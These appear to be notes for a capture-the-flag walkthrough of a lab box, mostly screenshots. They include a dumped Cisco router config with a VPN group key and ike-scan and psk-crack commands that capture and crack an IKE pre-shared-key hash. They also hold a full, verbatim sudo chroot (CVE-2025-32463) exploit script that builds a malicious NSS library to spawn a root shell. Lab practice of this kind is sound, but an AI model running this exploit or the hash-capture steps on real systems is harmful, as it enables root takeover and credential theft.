![[Pasted image 20260130204456.png]]


![[Pasted image 20260130205059.png]]


Based on this information, when I tried to dig more in hopes of finding a vulnerability, I came to know that this is the latest version of OpenSSH (released in April 2025) and has so far not recorded any severe vulnerabilities.


scan UDP ports 

![[Pasted image 20260130205546.png]]



Using Metasploit Tool

![[Pasted image 20260130205721.png]]

![[Pasted image 20260130205740.png]]

I connected to the TFTP server and downloaded the `ciscortr.cfg` file.

![[Pasted image 20260130210427.png]]



![[Pasted image 20260130210514.png]]

```

version 12.3

no service pad

service timestamps debug datetime msec

service timestamps log datetime msec

no service password-encryption

!

hostname expressway

!

boot-start-marker

boot-end-marker

!

enable password *****

!

username ike password *****

ip subnet-zero

ip cef

!

vpdn enable

        vpdn-group 1

        request-dialin

        protocol pppoe



!

ip dhcp excluded-address 10.0.1.1 10.0.1.10

ip dhcp excluded-address 10.0.2.1 10.0.2.10

ip dhcp excluded-address 10.0.3.1 10.0.3.10

!

ip dhcp pool vlan1

   network 10.0.1.0 255.255.255.0

   default-router 10.0.1.1 

!

ip dhcp pool vlan2

   network 10.0.2.0 255.255.255.0

   default-router 10.0.2.1 

!

ip dhcp pool vlan3

   network 10.0.3.0 255.255.255.0

   default-router 10.0.3.1 

!

ip ips po max-events 100

no ftp-server write-enable

!

bridge irb

!

interface FastEthernet0

        no ip address

!

interface FastEthernet1

        no ip address

!

interface FastEthernet2

        no ip address

!

interface FastEthernet3

        switchport mode trunk

        no ip address

!

interface FastEthernet4

        ip address 192.168.68.1 255.255.255.0

        no ip directed-broadcast (default)

        speed auto

        ip nat outside

        ip access-group 103 in

        no cdp enable

        crypto ipsec client ezvpn ezvpnclient outside

        crypto map static-map

!

crypto isakmp policy 1

        encryption 3des

        authentication pre-share

        group 2

        lifetime 480

!

crypto isakmp client configuration group rtr-remote

        key secret-password

        dns 208.67.222.222

        domain expressway.htb

        pool dynpool

!

crypto ipsec transform-set vpn1 esp-3des esp-md5

!

crypto ipsec security-association lifetime seconds 86400

!

crypto dynamic-map dynmap 1

        set transform-set vpn1

        reverse-route

!

crypto map static-map 1 ipsec-isakmp dynamic dynmap

crypto map dynmap isakmp authorization list rtr-remote

crypto map dynmap client configuration address respond

crypto ipsec client ezvpn ezvpnclient

        connect auto

        group 2 key secret-password

        mode client

        peer 192.168.100.1

!

interface Dot11Radio0

        no ip address

        !

        broadcast-key vlan 1 change 45

        !

        encryption vlan 1 mode ciphers tkip 

        !

        ssid cisco

                vlan 1

                authentication open 

                authentication network-eap eap_methods 

                authentication key-management wpa optional

        !

        ssid ciscowep

                vlan 2

                authentication open 

                !

        ssid ciscowpa

                vlan 3

                authentication open 

        !

        speed basic-1.0 basic-2.0 basic-5.5 6.0 9.0 basic-11.0 12.0 18.0 24.0 36.0 48.0 54.0

        rts threshold 2312

        power local cck 50

        power local ofdm 30

        channel 2462

        station-role root

!

interface Dot11Radio0.1

        description Cisco Open

        encapsulation dot1Q 1 native

        no cdp enable

        bridge-group 1

        bridge-group 1 subscriber-loop-control

        bridge-group 1 spanning-disabled

        bridge-group 1 block-unknown-source

        no bridge-group 1 source-learning

        no bridge-group 1 unicast-flooding

!

interface Dot11Radio0.2

        encapsulation dot1Q 2

        bridge-group 2

        bridge-group 2 subscriber-loop-control

        bridge-group 2 spanning-disabled

        bridge-group 2 block-unknown-source

        no bridge-group 2 source-learning

        no bridge-group 2 unicast-flooding

!

interface Dot11Radio0.3

        encapsulation dot1Q 3

        bridge-group 3

        bridge-group 3 subscriber-loop-control

        bridge-group 3 spanning-disabled

        bridge-group 3 block-unknown-source

        no bridge-group 3 source-learning

        no bridge-group 3 unicast-flooding

!

interface Vlan1

        no ip address

        no ip directed-broadcast (default)

        ip nat inside

        crypto ipsec client ezvpn ezvpnclient inside

        ip inspect firewall in

        no cdp enable

        bridge-group 1

        bridge-group 1 spanning-disabled

!

interface Vlan2

        no ip address

        bridge-group 2

        bridge-group 2 spanning-disabled

!

interface Vlan3

        no ip address

        bridge-group 3

        bridge-group 3 spanning-disabled

!

interface BVI1

        ip address 10.0.1.1 255.255.255.0

!

interface BVI2

        ip address 10.0.2.1 255.255.255.0

!

ip classless

!

ip http server

no ip http secure-server

!

control-plane

!

bridge 1 route ip

bridge 2 route ip

bridge 3 route ip

!

ip inspect name firewall tcp

ip inspect name firewall udp

!

access-list 103 permit udp host 200.1.1.1 any eq isakmp

access-list 103 permit udp host 200.1.1.1 eq isakmp any

no cdp run

!

line con 0

        password *****

        no modem enable

        transport preferred all

        transport output all

line aux 0

        transport preferred all

        transport output all

line vty 0 4

        password *****

        transport preferred all

        transport input all

        transport output all



```

![[Pasted image 20260130210750.png]]


There is a [known vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2018-5389) in the **IKE Aggressive mode**, where we can exploit it to get the hash of the password _(if Pre-shared Keys are used)_ required to authenticate to the VPN.

```
ike-scan -M -A -n rtr-remote -P 10.129.238.52
```

![[Pasted image 20260130210624.png]]


Here is a breakdown of the command:

- `-M`: Enables multi-line output (easier to read).
- `-A`: Enables Aggressive Mode.
- `-n`: Specifies the Group ID we found in the config file.
- `-P`: Captures the hash shared by the server.

As you can see, I was able to capture the password hash. I now have the hash ready for cracking.


```
psk-crack -d /home/thunder/wordlist/rockyou.txt hash.txt
```

![[Pasted image 20260130211019.png]]


![[Pasted image 20260130211259.png]]

![[Pasted image 20260130211358.png]]


![[Pasted image 20260130211422.png]]


![[Pasted image 20260130211634.png]]


I used the `sudo` version to look for any CVEs related to it and BINGO! I found one! This is `[CVE-2025–32463](https://www.exploit-db.com/exploits/52352)`**.** This was my way in. I did​ not put any effort in understanding the CVE, but the gist is it tricks sudo to load a configuration file from a directory I control. I just copied the Proof of Concept code, pasted and labeled it as `exp.sh` in the target system.


```
Exploit Title: Sudo chroot 1.9.17 - Local Privilege Escalation  
Google Dork: not aplicable  
Date: Mon, 30 Jun 2025  
Exploit Author: Stratascale  
Vendor Homepage:https://salsa.debian.org/sudo-team/sudo  
Software Link:  
Version: Sudo versions 1.9.14 to 1.9.17 inclusive  
Tested on: Kali Rolling 2025-7-3  
CVE : CVE-2025-32463  
  
*Version running today in Kali:*  
https://pkg.kali.org/news/640802/sudo-1916p2-2-imported-into-kali-rolling/  
  
*Background*  
  
An attacker can leverage sudo's -R (--chroot) option to run  
arbitrary commands as root, even if they are not listed in the  
sudoers file.  
  
Sudo versions affected:  
  
Sudo versions 1.9.14 to 1.9.17 inclusive are affected.  
  
CVE ID:  
  
This vulnerability has been assigned CVE-2025-32463 in the  
Common Vulnerabilities and Exposures database.  
  
Details:  
  
Sudo's -R (--chroot) option is intended to allow the user to  
run a command with a user-selected root directory if the sudoers  
file allows it. A change was made in sudo 1.9.14 to resolve  
paths via chroot() using the user-specified root directory while  
the sudoers file was still being evaluated. It is possible for  
an attacker to trick sudo into loading an arbitrary shared  
library by creating an /etc/nsswitch.conf file under the  
user-specified root directory.  
  
The change from sudo 1.9.14 has been reverted in sudo 1.9.17p1  
and the chroot feature has been marked as deprecated. It will  
be removed entirely in a future sudo release. Because of the  
way sudo resolves commands, supporting a user-specified chroot  
directory is error-prone and this feature does not appear to  
be widely used.  
  
A more detailed description of the bug and its effects can be  
found in the Stratascale advisory:  
https://www.stratascale.com/vulnerability-alert-CVE-2025-32463-sudo-chroot  
  
Impact:  
  
On systems that support /etc/nsswitch.conf a user may be able  
to run arbitrary commands as root.  
  
*Exploit:*  
  
*Verify the sudo version running: sudo --versionIf is vulnerable, copy and  
paste the following code and run it.*  
*----------------------*  
#!/bin/bash  
# sudo-chwoot.sh – PoC CVE-2025-32463  
set -e  
  
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)  
cd "$STAGE"  
  
# 1. NSS library  
cat > woot1337.c <<'EOF'  
#include <stdlib.h>  
#include <unistd.h>  
  
__attribute__((constructor))  
void woot(void) {  
setreuid(0,0); /* change to UID 0 */  
setregid(0,0); /* change to GID 0 */  
chdir("/"); /* exit from chroot */  
execl("/bin/bash","/bin/bash",NULL); /* root shell */  
}  
EOF  
  
# 2. Mini chroot with toxic nsswitch.conf  
mkdir -p woot/etc libnss_  
echo "passwd: /woot1337" > woot/etc/nsswitch.conf  
cp /etc/group woot/etc # make getgrnam() not fail  
  
# 3. compile libnss_  
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c  
  
echo "[*] Running exploit…"  
sudo -R woot woot # (-R <dir> <cmd>)  
# • the first “woot” is chroot  
# • the second “woot” is and inexistent  
command  
# (only needs resolve the user)  
  
rm -rf "$STAGE"  
*----------------------*
```


![[Pasted image 20260130211845.png]]


![[Pasted image 20260130212012.png]]


![[Pasted image 20260130212041.png]]
